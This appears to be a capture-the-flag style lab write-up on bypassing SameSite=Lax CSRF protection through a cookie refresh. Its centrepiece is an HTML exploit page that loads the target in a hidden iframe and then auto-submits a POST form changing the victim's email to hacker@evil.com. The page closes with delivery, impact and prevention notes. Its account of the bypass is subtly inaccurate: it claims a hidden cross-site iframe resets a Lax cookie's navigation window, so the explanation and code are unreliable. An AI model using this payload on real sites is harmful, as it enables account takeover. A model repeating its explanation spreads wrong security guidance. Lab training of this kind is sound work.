# Lab: SameSite Lax bypass via cookie refresh

**Difficulty:** Practitioner  
**Category:** Cross-Site Request Forgery (CSRF) / SameSite Cookies

## 🎯 Objective
Bypass `SameSite=Lax` protection by refreshing the session cookie.

## 📖 Description
The session cookie uses `SameSite=Lax`. Normally this blocks cross-site POST requests. However, the application allows refreshing the cookie (e.g. by visiting a page on the target domain), which resets the "recent navigation" timer and allows the subsequent POST request to be sent.

## 🔍 Vulnerability Analysis

- **Cookie Attribute**: `SameSite=Lax`
- **Bypass Technique**: 
  1. Make the victim visit the target site first (to refresh the cookie).
  2. Then perform the CSRF POST request.

## 🛠️ How to Solve (Step by Step)

1. Confirm the cookie is `SameSite=Lax`.
2. Create a multi-step exploit:
   - First: Redirect or iframe to a page on the target site to refresh the cookie.
   - Second: Submit the CSRF form (POST).
3. Combine both steps in one HTML page.

## 💥 Exploit Code (Example)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>SameSite Lax Bypass - Cookie Refresh</title>
</head>
<body>
    <!-- Step 1: Refresh cookie by loading a page on target domain -->
    <iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account" style="display:none;"></iframe>
    
    <!-- Step 2: Perform the CSRF attack -->
    <form id="csrf-form" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="hacker@evil.com">
    </form>

    <script>
        // Give time for cookie refresh
        setTimeout(() => {
            document.getElementById('csrf-form').submit();
        }, 1500);
    </script>
</body>
</html>
```
🚀 Delivery
Upload to Exploit Server → Deliver to victim.
⚡ Impact

SameSite=Lax can be bypassed with timing + navigation tricks.
Common in real-world applications with auto-refresh or keep-alive mechanisms.

🛡️ Prevention

Prefer SameSite=Strict for sensitive sessions.
Implement short-lived cookies or re-authentication for critical actions.
Always use CSRF tokens as the primary defense.

🔬 Key Learning Points

SameSite=Lax allows GET after top-level navigation.
Cookie "freshness" can be manipulated.
Timing attacks and multi-step exploits are powerful against SameSite.
